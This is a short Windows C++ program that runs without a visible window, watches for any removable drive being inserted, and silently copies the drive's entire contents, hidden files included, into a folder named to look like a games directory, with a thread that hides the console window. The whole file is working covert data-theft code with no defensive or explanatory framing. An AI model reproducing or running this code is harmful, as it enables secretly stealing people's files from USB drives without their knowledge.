#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	
#include <windows.h>
#include <string.h>
#include <string>
#include <stdlib.h>
using namespace std;

char src[20] = "X:\\";
char dest[20] = "i:\\games\\files\\";
unsigned char i;
bool flag;
bool check;
HANDLE hthread = NULL;
HANDLE hthread2 = NULL;

DWORD WINAPI copyfile(LPVOID) {
	char cmd[200];
	sprintf(cmd, "cmd.exe /c xcopy %c: %s /e /y /q /h", i, dest);
	system(cmd);
	flag = true;
	return 0;
}

DWORD WINAPI hide(LPVOID) {
	while (true) {
		check = ShowWindow(FindWindow("ConsoleWindowClass", NULL), SW_HIDE);
		if (check)
			break;
	}
	return 0;
}


int main() {
	flag = false;
	while (!flag) {
		UINT DiskType;
		for (i = 'B'; i < 'Z'; i++) {
			src[0] = i;
			DiskType = GetDriveType(src);
			if (DiskType == DRIVE_REMOVABLE)
				hthread = CreateThread(NULL, 0, copyfile, NULL, 0, NULL);
			if (hthread)
				hthread2 = CreateThread(NULL, 0, hide, NULL, 0, NULL);
		}
		Sleep(5000);
	}
	Sleep(3*60*1000);
	return 0;
}